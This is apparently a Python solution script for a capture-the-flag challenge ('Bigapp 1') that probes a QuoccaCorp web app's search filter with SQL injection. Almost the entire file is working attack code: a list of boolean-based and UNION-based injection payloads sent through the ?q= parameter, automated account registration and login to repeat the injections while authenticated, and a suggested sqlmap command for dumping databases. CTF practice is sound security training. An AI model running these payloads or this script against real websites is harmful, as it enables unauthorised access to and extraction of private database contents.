#!/usr/bin/env python3
"""
CTF: Bigapp 1 - QuoccaCorp hidden products finder
Target: https://bigapp.quoccacorp.com
Goal: Find hidden/unannounced products via SQL injection in the ?q= filter
"""

import requests
from bs4 import BeautifulSoup

BASE_URL = "https://bigapp.quoccacorp.com"

session = requests.Session()


def get_products(payload):
    """Submit a filter query and return all product rows."""
    resp = session.get(BASE_URL + "/", params={"q": payload}, timeout=10)
    soup = BeautifulSoup(resp.text, "html.parser")
    rows = []
    for tr in soup.select("tbody tr"):
        cells = [td.get_text(strip=True) for td in tr.find_all(["th", "td"])]
        rows.append(cells)
    return rows


def print_products(rows):
    if not rows:
        print("  (no results)")
        return
    for row in rows:
        print("  |", " | ".join(row), "|")


def run():
    print("=" * 60)
    print("QuoccaCorp CTF - Hidden Products Finder")
    print("=" * 60)

    # 1. Baseline - normal listing
    print("\n[1] Baseline (empty filter):")
    baseline = get_products("")
    print_products(baseline)
    baseline_names = {r[0] for r in baseline}

    # 2. Classic SQLi - bypass any hidden/announced flag
    sqli_payloads = [
        # Boolean-based: make WHERE always true
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1-- -",
        "' OR 1=1#",
        # UNION-based (adjust column count if needed)
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        # Try to dump all rows ignoring hidden flag
        "x' OR name IS NOT NULL OR name='",
    ]

    found_hidden = []

    for payload in sqli_payloads:
        print(f"\n[*] Trying: {repr(payload)}")
        try:
            rows = get_products(payload)
            if rows:
                new = [r for r in rows if r[0] not in baseline_names]
                print_products(rows)
                if new:
                    print(f"  *** NEW (hidden?) products found: {new}")
                    found_hidden.extend(new)
            else:
                print("  (no results)")
        except Exception as e:
            print(f"  Error: {e}")

    # 3. Authenticated access - try to register+login and search
    print("\n[2] Attempting registration and authenticated search...")
    reg_data = {
        "fname": "CTF",
        "lname": "Tester",
        "email": "ctftester9999@example.com",
        "password": "Password123!",
        "mobile": "0",
        "city": "Sydney",
        "state": "NSW",
    }
    reg_resp = session.post(BASE_URL + "/register", data=reg_data, allow_redirects=True)
    print(f"  Register status: {reg_resp.status_code}")

    login_data = {"email": "ctftester9999@example.com", "password": "Password123!"}
    login_resp = session.post(BASE_URL + "/login", data=login_data, allow_redirects=True)
    print(f"  Login status: {login_resp.status_code}")
    print(f"  Final URL: {login_resp.url}")

    print("\n[3] Authenticated baseline search (empty filter):")
    auth_rows = get_products("")
    auth_new = [r for r in auth_rows if r[0] not in baseline_names]
    print_products(auth_rows)
    if auth_new:
        print(f"  *** Extra products visible when logged in: {auth_new}")
        found_hidden.extend(auth_new)

    print("\n[4] Authenticated SQLi payloads:")
    for payload in sqli_payloads[:4]:
        print(f"\n[*] Trying (auth): {repr(payload)}")
        try:
            rows = get_products(payload)
            new = [r for r in rows if r[0] not in baseline_names]
            print_products(rows)
            if new:
                print(f"  *** Hidden product rows: {new}")
                found_hidden.extend(new)
        except Exception as e:
            print(f"  Error: {e}")

    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY - Potential hidden products found:")
    seen = set()
    for r in found_hidden:
        key = tuple(r)
        if key not in seen:
            seen.add(key)
            print(" ", r)

    if not found_hidden:
        print("  None found yet - may need manual investigation or different SQLi approach.")
        print("\nManual tips:")
        print("  - Try sqlmap: sqlmap -u 'https://bigapp.quoccacorp.com/?q=test' -p q --dbs")
        print("  - Check JS source for hidden API endpoints")
        print("  - Inspect network tab for XHR calls to undocumented routes")


if __name__ == "__main__":
    run()
